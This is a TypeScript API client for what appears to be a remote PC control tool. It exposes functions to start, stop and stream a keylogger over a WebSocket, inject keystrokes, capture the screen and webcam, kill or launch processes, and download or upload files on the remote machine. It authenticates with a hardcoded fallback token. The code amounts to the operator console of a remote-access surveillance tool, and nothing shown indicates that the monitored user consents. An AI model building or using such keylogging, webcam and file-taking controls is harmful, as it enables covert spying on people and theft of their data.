const AUTH_TOKEN = import.meta.env.VITE_AUTH_TOKEN || "remote-pc-secret";

interface APIResponse<T = unknown> {
  success: boolean;
  message?: string;
  data?: T;
}

function getApiBase(): string {
  if (typeof window !== "undefined") {
    const stored = localStorage.getItem("serviceUrl");
    if (stored) return stored;
  }
  return import.meta.env.VITE_API_URL || "http://localhost:8080";
}

const API_BASE = getApiBase(); //brough out
async function request<T>(
  endpoint: string,
  options: RequestInit = {}
): Promise<APIResponse<T>> {

  const url = `${API_BASE}${endpoint}`;
  const res = await fetch(url, {
    ...options,
    headers: {
      "Content-Type": "application/json",
      "X-Auth-Token": AUTH_TOKEN,
      ...options.headers,
    },
  });
  return res.json();
}

export const api = {
  // System
  getSystemInfo: () => request("/api/system/info"),
  systemControl: (action: string, delay = 0) =>
    request("/api/system/control", {
      method: "POST",
      body: JSON.stringify({ action, delay }),
    }),

  // Applications
  listApps: () => request("/api/apps"),
  startApp: (path: string, args?: string[]) =>
    request("/api/apps/start", {
      method: "POST",
      body: JSON.stringify({ path, args }),
    }),
  stopApp: (pid: number) =>
    request(`/api/apps/stop?pid=${pid}`, { method: "DELETE" }),

  // Processes
  listProcesses: () => request("/api/processes"),
  startProcess: (path: string, args?: string[]) =>
    request("/api/processes/start", {
      method: "POST",
      body: JSON.stringify({ path, args }),
    }),
  killProcess: (pid: number) =>
    request(`/api/processes/kill?pid=${pid}`, { method: "DELETE" }),

  // Screenshot
  takeScreenshot: () => request<{ image: string; format: string }>("/api/screenshot"),
  getScreenshotUrl: () => `${API_BASE}/api/screenshot/image`,

  // Keylogger
  startKeylogger: () =>
    request("/api/keylogger/start", { method: "POST" }),
  stopKeylogger: () =>
    request("/api/keylogger/stop", { method: "POST" }),
  getKeyloggerStatus: () => request("/api/keylogger/status"),
  sendKeys: (keys: string) =>
    request("/api/keylogger/send", {
      method: "POST",
      body: JSON.stringify({ keys }),
    }),

  // Files
  listFiles: (path?: string) =>
    request(`/api/files${path ? `?path=${encodeURIComponent(path)}` : ""}`),
  copyFile: (source: string, destination: string) =>
    request("/api/files/copy", {
      method: "POST",
      body: JSON.stringify({ source, destination }),
    }),
  downloadFileUrl: (path: string) =>
    `${API_BASE}/api/files/download?path=${encodeURIComponent(path)}`,
  uploadFile: async (file: File, destPath?: string) => {
    const formData = new FormData();
    formData.append("file", file);
    if (destPath) formData.append("path", destPath);

    const res = await fetch(`${API_BASE}/api/files/upload`, {
      method: "POST",
      headers: { "X-Auth-Token": AUTH_TOKEN },
      body: formData,
    });
    return res.json();
  },

  // Webcam
  listWebcams: () => request("/api/webcam/list"),
  getWebcamStatus: () => request("/api/webcam/status"),
  startWebcam: (output?: string) =>
    request(`/api/webcam/start${output ? `?output=${encodeURIComponent(output)}` : ""}`, {
      method: "POST",
    }),
  stopWebcam: () => request("/api/webcam/stop", { method: "POST" }),

  // WebSocket
  keyloggerWS: () => {
    const wsBase = API_BASE.replace(/^http/, "ws");
    return new WebSocket(`${wsBase}/ws/keylogger`);
  },
};

export type { APIResponse };
